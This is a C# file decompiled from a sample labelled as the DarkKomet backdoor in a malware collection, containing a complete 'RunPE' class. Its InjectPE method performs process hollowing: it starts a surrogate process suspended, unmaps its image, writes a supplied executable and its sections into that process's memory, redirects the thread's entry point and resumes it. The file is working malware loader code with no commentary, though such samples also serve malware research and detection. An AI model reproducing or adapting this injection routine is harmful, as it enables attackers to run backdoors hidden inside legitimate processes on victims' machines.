// Decompiled with JetBrains decompiler
// Type: RunPE
// Assembly: DEECDF, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 641CAFA7-4057-442D-8D3F-99927627E003
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.aaqd-09225744ccf3bb45d0baa0d18af92c49a6dee7af3ced76f52efa500266c47656.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

public class RunPE
{
  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool CreateProcess(
    string appName,
    StringBuilder commandLine,
    IntPtr procAttr,
    IntPtr thrAttr,
    [MarshalAs(UnmanagedType.Bool)] bool inherit,
    int creation,
    IntPtr env,
    string curDir,
    byte[] sInfo,
    IntPtr[] pInfo);

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool GetThreadContext(IntPtr hThr, uint[] ctxt);

  [DllImport("ntdll")]
  private static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool ReadProcessMemory(
    IntPtr hProc,
    IntPtr baseAddr,
    ref IntPtr bufr,
    int bufrSize,
    ref IntPtr numRead);

  [DllImport("kernel32.dll")]
  private static extern uint ResumeThread(IntPtr hThread);

  [DllImport("kernel32")]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool SetThreadContext(IntPtr hThr, uint[] ctxt);

  [DllImport("kernel32")]
  private static extern IntPtr VirtualAllocEx(
    IntPtr hProc,
    IntPtr addr,
    IntPtr size,
    int allocType,
    int prot);

  [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern bool VirtualProtectEx(
    IntPtr hProcess,
    IntPtr lpAddress,
    IntPtr dwSize,
    uint flNewProtect,
    ref uint lpflOldProtect);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern bool WriteProcessMemory(
    IntPtr hProcess,
    IntPtr lpBaseAddress,
    byte[] lpBuffer,
    uint nSize,
    int lpNumberOfBytesWritten);

  public static bool InjectPE(byte[] bytes, string surrogateProcess)
  {
    bool flag;
    try
    {
      IntPtr zero1 = IntPtr.Zero;
      IntPtr[] pInfo = new IntPtr[4];
      byte[] sInfo = new byte[68];
      int int32 = BitConverter.ToInt32(bytes, 60);
      int int16 = (int) BitConverter.ToInt16(bytes, checked (int32 + 6));
      IntPtr nSize = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 84)));
      if (RunPE.CreateProcess((string) null, new StringBuilder(surrogateProcess), zero1, zero1, false, 4, zero1, (string) null, sInfo, pInfo))
      {
        uint[] ctxt = new uint[179];
        ctxt[0] = 65538U;
        if (RunPE.GetThreadContext(pInfo[1], ctxt))
        {
          IntPtr baseAddr = new IntPtr(checked ((long) ctxt[41] + 8L));
          IntPtr zero2 = IntPtr.Zero;
          IntPtr bufrSize = new IntPtr(4);
          IntPtr zero3 = IntPtr.Zero;
          if (RunPE.ReadProcessMemory(pInfo[0], baseAddr, ref zero2, (int) bufrSize, ref zero3) && RunPE.NtUnmapViewOfSection(pInfo[0], zero2) == 0U)
          {
            IntPtr num1 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 52)));
            IntPtr num2 = new IntPtr(BitConverter.ToInt32(bytes, checked (int32 + 80)));
            IntPtr lpBaseAddress = RunPE.VirtualAllocEx(pInfo[0], num1, num2, 12288, 64);
            int lpNumberOfBytesWritten;
            RunPE.WriteProcessMemory(pInfo[0], lpBaseAddress, bytes, checked ((uint) (int) nSize), lpNumberOfBytesWritten);
            int num3 = checked (int16 - 1);
            int num4 = 0;
            while (num4 <= num3)
            {
              int[] dst = new int[10];
              Buffer.BlockCopy((Array) bytes, checked (int32 + 248 + num4 * 40), (Array) dst, 0, 40);
              byte[] numArray = new byte[checked (dst[4] - 1 + 1)];
              Buffer.BlockCopy((Array) bytes, dst[5], (Array) numArray, 0, numArray.Length);
              num2 = new IntPtr(checked (lpBaseAddress.ToInt32() + dst[3]));
              num1 = new IntPtr(numArray.Length);
              RunPE.WriteProcessMemory(pInfo[0], num2, numArray, checked ((uint) (int) num1), lpNumberOfBytesWritten);
              checked { ++num4; }
            }
            num2 = new IntPtr(checked ((long) ctxt[41] + 8L));
            num1 = new IntPtr(4);
            RunPE.WriteProcessMemory(pInfo[0], num2, BitConverter.GetBytes(lpBaseAddress.ToInt32()), checked ((uint) (int) num1), lpNumberOfBytesWritten);
            ctxt[44] = checked ((uint) (lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, int32 + 40)));
            RunPE.SetThreadContext(pInfo[1], ctxt);
          }
        }
        int num = (int) RunPE.ResumeThread(pInfo[1]);
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
      goto label_10;
    }
    return true;
label_10:
    return flag;
  }
}
